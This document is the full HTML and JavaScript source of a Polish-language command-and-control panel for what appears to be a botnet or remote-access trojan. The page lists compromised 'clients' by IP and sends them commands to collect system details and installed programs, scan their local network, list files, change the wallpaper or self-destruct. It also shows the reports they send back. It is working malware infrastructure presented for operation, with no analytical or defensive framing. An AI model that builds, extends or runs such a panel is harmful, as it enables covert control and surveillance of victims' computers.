<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zarządzanie Serwerem C&C</title>
    <style>
        :root {
            --bg-color: #121212;
            --text-color: #e0e0e0;
            --primary-color: #00aaff;
            --secondary-color: #2c2c2c;
            --card-bg: #1e1e1e;
            --green: #4caf50;
            --red: #f44336;
            --yellow: #ffeb3b;
            --cyan: #00bcd4;
            --magenta: #e91e63;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }

        .container {
            max-width: 900px;
            margin: auto;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        h1, h2 {
            text-align: center;
            color: var(--primary-color);
        }

        .card {
            background-color: var(--card-bg);
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
        }

        .client-list, .command-panel {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .client-item {
            background-color: var(--secondary-color);
            padding: 10px 15px;
            border-radius: 8px;
            border: 1px solid transparent;
            cursor: pointer;
            transition: background-color 0.3s, border-color 0.3s;
        }

        .client-item.active {
            border-color: var(--primary-color);
            background-color: #383838;
        }
        
        .client-item:hover {
            background-color: #383838;
        }

        .client-item h3 {
            margin: 0 0 5px 0;
            color: var(--green);
        }

        .client-item p {
            margin: 0;
            font-size: 0.9em;
            color: #b0b0b0;
        }

        .command-panel select, .command-panel input, .command-panel button {
            padding: 10px;
            border-radius: 5px;
            border: 1px solid var(--secondary-color);
            background-color: var(--bg-color);
            color: var(--text-color);
        }

        .command-panel button {
            background-color: var(--primary-color);
            border: none;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s;
        }

        .command-panel button:hover {
            background-color: #0088cc;
        }

        .report-log {
            height: 400px;
            overflow-y: scroll;
            background-color: var(--bg-color);
            padding: 15px;
            border-radius: 8px;
            border: 1px solid var(--secondary-color);
        }

        .log-entry {
            margin: 0;
            font-family: 'Courier New', Courier, monospace;
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .log-green { color: var(--green); }
        .log-yellow { color: var(--yellow); }
        .log-red { color: var(--red); }
        .log-cyan { color: var(--cyan); }
        .log-magenta { color: var(--magenta); }
        .log-blue { color: #007bff; }
        .log-white { color: var(--text-color); }
        .log-server { color: #8a2be2; }

        .form-group {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .form-group.row {
            flex-direction: row;
            gap: 10px;
        }
        
        .form-group.row input {
            flex-grow: 1;
        }

        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }
            .form-group.row {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Panel Zarządzania Serwerem C&C</h1>
        
        <div class="card">
            <h2>Klienci</h2>
            <div id="client-list" class="client-list">
                <p>Ładowanie klientów...</p>
            </div>
            
            <hr>
            
            <h2>Wysyłanie Komend</h2>
            <div class="command-panel">
                <div class="form-group">
                    <label for="command-client-ip">Wybierz klienta:</label>
                    <select id="command-client-ip">
                        <option value="all">Wszyscy klienci</option>
                    </select>
                </div>

                <div class="form-group">
                    <label for="command-type">Wybierz komendę:</label>
                    <select id="command-type">
                        <option value="get-info">Pobierz informacje systemowe</option>
                        <option value="lan-print">Skanuj sieć LAN</option>
                        <option value="list-files">Wyświetl pliki</option>
                        <option value="change-wallpaper">Zmień tapetę</option>
                        <option value="self-destruct">Auto-destrukcja</option>
                    </select>
                </div>
                
                <div class="form-group" id="extra-data-group" style="display:none;">
                    <label for="extra-data-input">Dodatkowe dane (np. ścieżka):</label>
                    <input type="text" id="extra-data-input" placeholder="Wpisz tutaj dane...">
                </div>

                <button id="send-command-btn">Wyślij Komendę</button>
            </div>
        </div>
        
        <div class="card">
            <h2>Dziennik Raportów</h2>
            <div class="report-log" id="report-output">
            </div>
        </div>
    </div>

    <script>
        const API_URL = window.location.origin;

        const clientListDiv = document.getElementById('client-list');
        const commandClientSelect = document.getElementById('command-client-ip');
        const commandTypeSelect = document.getElementById('command-type');
        const sendCommandBtn = document.getElementById('send-command-btn');
        const extraDataGroup = document.getElementById('extra-data-group');
        const extraDataInput = document.getElementById('extra-data-input');
        
        const reportOutput = document.getElementById('report-output');

        function logMessage(message, colorClass = 'log-white') {
            const logEntry = document.createElement('pre');
            logEntry.className = `log-entry ${colorClass}`;
            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            reportOutput.appendChild(logEntry);
            reportOutput.scrollTop = reportOutput.scrollHeight;
        }

        async function fetchClients() {
            try {
                const response = await fetch(`${API_URL}/clients`);
                if (!response.ok) throw new Error('Network response was not ok');
                const clients = await response.json();
                
                clientListDiv.innerHTML = '';
                commandClientSelect.innerHTML = '<option value="all">Wszyscy klienci</option>';

                if (Object.keys(clients).length === 0) {
                    clientListDiv.innerHTML = '<p>Brak podłączonych klientów.</p>';
                    return;
                }

                for (const ip in clients) {
                    const details = clients[ip];
                    const lastSeen = new Date(details.last_seen * 1000).toLocaleString();
                    
                    const clientItem = document.createElement('div');
                    clientItem.className = 'client-item';
                    clientItem.innerHTML = `<h3>${ip} <span style="font-size:0.8em; color:#888;">(v${details.version})</span></h3>
                                            <p>Status: ${details.status}</p>
                                            <p>Ostatnio widziany: ${lastSeen}</p>`;
                    clientListDiv.appendChild(clientItem);

                    const option = document.createElement('option');
                    option.value = ip;
                    option.textContent = ip;
                    commandClientSelect.appendChild(option);
                }
            } catch (error) {
                clientListDiv.innerHTML = `<p style="color:var(--red);">Błąd: Nie można połączyć się z serwerem API. ${error.message}</p>`;
            }
        }
        
        function checkExtraDataVisibility() {
            const commandType = commandTypeSelect.value;
            if (['list-files', 'change-wallpaper'].includes(commandType)) {
                extraDataGroup.style.display = 'flex';
                extraDataInput.placeholder = 'Wpisz ścieżkę...';
            } else if (commandType === 'transfer-file') {
                extraDataGroup.style.display = 'flex';
                extraDataInput.placeholder = 'Wybierz plik do przesłania...';
            } else {
                extraDataGroup.style.display = 'none';
                extraDataInput.value = '';
            }
        }

        async function sendCommand() {
            const clientIP = commandClientSelect.value;
            const commandType = commandTypeSelect.value;
            const extraData = extraDataInput.value;
            
            const payload = {
                type: commandType,
                data: {}
            };
            
            if (extraDataGroup.style.display !== 'none') {
                payload.data = { path: extraData };
            }

            if (commandType === 'self-destruct' && !confirm(`Jesteś pewien, że chcesz zniszczyć klienta${clientIP === 'all' ? " WSZYSTKICH klientów" : ""}?`)) {
                return;
            }
            
            const endpoint = clientIP === 'all' ? '/send_command_to_all' : '/send_command';
            const body = {
                command: payload
            };
            if (clientIP !== 'all') {
                body.client_ip = clientIP;
            }

            logMessage(`[SERVER] Wysyłanie komendy '${commandType}' do ${clientIP === 'all' ? 'wszystkich klientów' : clientIP}...`, 'log-server');

            try {
                const response = await fetch(`${API_URL}${endpoint}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(body)
                });
                if (!response.ok) throw new Error('Failed to send command');
                
                const result = await response.json();
                logMessage(`[SERVER] ${result.message}`, 'log-green');
            } catch (error) {
                logMessage(`[SERVER] Błąd: Nie można wysłać polecenia. ${error.message}`, 'log-red');
            }
        }

        async function fetchReports() {
            try {
                const response = await fetch(`${API_URL}/get_reports`);
                if (!response.ok) throw new Error('Failed to fetch reports');
                const reports = await response.json();
                
                reports.forEach(report => {
                    let logClass = 'log-white';
                    let logMessage = `[${report.client_ip}] -> ${report.status}`;

                    switch (report.status) {
                        case 'new_connection':
                            logClass = 'log-green';
                            logMessage = `[SERWER] Klient [${report.client_ip}] połączony pomyślnie.`;
                            break;
                        case 'lan-scan-complete':
                            logClass = 'log-cyan';
                            logMessage = `[RAPORT] [${report.client_ip}] -> Wyniki skanowania sieci LAN:\n  • ${report.info.lan_devices.join('\n  • ')}`;
                            break;
                        case 'system-info-complete':
                            logClass = 'log-magenta';
                            logMessage = `[RAPORT] [${report.client_ip}] [INFO SYSTEMOWE] Zgromadzone dane:\n  • System operacyjny: ${report.info.os}\n  • Katalog domowy: ${report.info.home_directory}\n  • Zainstalowane programy: ${report.info.installed_programs.slice(0, 5).join(', ')}...`;
                            break;
                        case 'file-list-complete':
                            logClass = 'log-blue';
                            logMessage = `[RAPORT] [${report.client_ip}] -> Lista plików dla ścieżki '${report.info.path}':\n${JSON.stringify(report.info.file_tree, null, 2)}`;
                            break;
                        case 'script-output':
                            logClass = 'log-yellow';
                            logMessage = `[RAPORT] [${report.client_ip}] -> Wynik wykonania skryptu:\n${report.info.output}`;
                            break;
                        case 'file-transfer-complete':
                        case 'wallpaper-change-complete':
                            logClass = 'log-green';
                            logMessage = `[RAPORT] [${report.client_ip}] -> ${report.status.replace(/-/g, ' ')}`;
                            break;
                        case 'wallpaper-change-error':
                            logClass = 'log-red';
                            logMessage = `[RAPORT] [${report.client_ip}] -> Błąd zmiany tapety: ${report.info.error}`;
                            break;
                        case 'self-destruct':
                            logClass = 'log-red';
                            logMessage = `[RAPORT] [${report.client_ip}] -> Samozniszczenie rozpoczęte.`;
                            break;
                        default:
                            if (report.status.includes('error')) {
                                logClass = 'log-red';
                            } else if (report.status.includes('complete')) {
                                logClass = 'log-green';
                            }
                            logMessage = `[RAPORT] [${report.client_ip}] -> ${report.status.replace(/-/g, ' ')}`;
                    }
                    
                    const logEntry = document.createElement('pre');
                    logEntry.className = `log-entry ${logClass}`;
                    logEntry.textContent = `[${new Date(report.time * 1000).toLocaleTimeString()}] ${logMessage}`;
                    reportOutput.appendChild(logEntry);
                    reportOutput.scrollTop = reportOutput.scrollHeight;
                });

            } catch (error) {
                console.error('Error fetching reports:', error);
            }
        }

        // Event Listeners
        commandTypeSelect.addEventListener('change', checkExtraDataVisibility);
        sendCommandBtn.addEventListener('click', sendCommand);

        // Initial calls
        checkExtraDataVisibility();
        fetchClients();
        setInterval(fetchClients, 5000);
        setInterval(fetchReports, 1000);
        
        logMessage("Witamy w Panelu Zarządzania Serwerem C&C. Odpowiedzi od klientów pojawią się w Dzienniku Raportów.", 'log-server');
    </script>
</body>
</html>
